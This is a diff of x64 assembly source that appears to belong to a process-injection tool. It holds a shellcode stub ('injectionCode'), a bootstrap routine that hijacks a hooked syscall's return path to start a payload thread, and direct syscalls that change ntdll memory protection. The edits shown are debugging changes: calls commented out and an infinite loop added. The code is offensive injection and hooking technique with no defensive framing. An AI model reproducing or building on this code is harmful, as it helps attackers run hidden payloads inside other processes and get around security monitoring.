@@ -1,33 +1,41 @@
 ;extrn NtSuspendProcess: PROC
 ;extrn LdrInitializeThunk: PROC
-.code
-mymemcmp PROC
-	push rsi
-	push rdi
-	mov rsi, rcx
-	mov rdi, rdx
-	mov rcx, r8
-	cld
-	cmp rcx, rcx
-	repe cmpsb
-	setz al
-	pop rdi
-	pop rsi
-	ret
-mymemcmp ENDP
+
+;mymemcmp PROC
+;	push rsi
+;	push rdi
+;	mov rsi, rcx
+;	mov rdi, rdx
+;	mov rcx, r8
+;	cld
+;	cmp rcx, rcx
+;	repe cmpsb
+;	setz al
+;	pop rdi
+;	pop rsi
+;	ret
+;mymemcmp ENDP
 
 .data
 injectionCode PROC
+	dw 050Fh
+	db 090h
 	db 0E8h
 	dd 0BBBBBBBBh
 injectionCode ENDP
-
+.code
 ;fpBootstrapRoutine PROC
 bootstrapRoutineBegin PROC
 bootstrapRoutineBegin ENDP
+	;or r10,-1
+	;mov eax, 161h
+	;syscall
+;looooooop:
+;	jmp looooooop
+
 	push rbx
 	mov rax, qword ptr [rsp+8]
-	sub rax, 5
+	sub rax, 8
 	mov qword ptr [rsp+8], rax
 	dw 0BB48h	;movabs rbx, ?
 originalSyscallCode PROC
@@ -47,26 +55,26 @@ originalSyscallCode ENDP
 iswow64:
 	;ret
 isamd64:
-	push rcx
-	push rdx
-	push r8
-	push r9
-	sub rsp, 20h
+	;push rcx
+	;push rdx
+	;push r8
+	;push r9
+	;sub rsp, 20h
 	;lea rcx, NtSuspendProcess ;(this is Not pic code!)
 	;int 3
 	;or r10,-1
 	;mov eax, 161h
-	call fpCreatePayloadThread
+	;call fpCreatePayloadThread
 	;syscall
-	;looooop:
-	;jmp looooop
+	looooop:
+	jmp looooop
 
-	add rsp, 20h
-	pop r9
-	pop r8
-	pop rdx
-	pop rcx
-	ret
+	;add rsp, 20h
+	;pop r9
+	;pop r8
+	;pop rdx
+	;pop rcx
+	;ret
 ;fpBootstrapRoutine ENDP
 
 syscallStub PROC
@@ -160,6 +168,9 @@ ntProtectVirtMemNumber ENDP
 	add rsp, 50h
 	;status = NtProtectVirtualMemory(hProcess, &pNtdllRxBegin, &bytesToProtect, PAGE_EXECUTE_READWRITE, &oldHookProtect);
 	;int 3
+	or r10,-1
+	mov eax, 144h
+	syscall
 	or r10,-1
 	mov eax, 161h
 	syscall
